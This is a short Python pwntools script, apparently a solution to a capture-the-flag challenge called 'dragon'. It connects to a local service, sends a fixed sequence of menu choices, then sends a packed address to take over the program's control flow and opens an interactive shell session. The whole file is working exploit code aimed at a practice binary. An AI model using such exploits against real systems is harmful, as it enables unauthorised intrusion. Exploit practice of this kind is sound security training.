from pwn import * 

def main():
    #p = process('/home/dragon/dragon')
    p = remote('0', '9004')
    for _ in range(4):
        p.sendline("1")
    for _ in range(2):
        p.sendline("3")
    p.sendline("2")
    for _ in range(2):
        p.sendline("3")
    p.sendline("2")
    for _ in range(2):
        p.sendline("3")
    p.sendline("2")
    for _ in range(2):
        p.sendline("3")
    p.sendline("2")
    p.sendline(p32(0x08048dbf))
    p.interactive()

if __name__ == "__main__":
    main()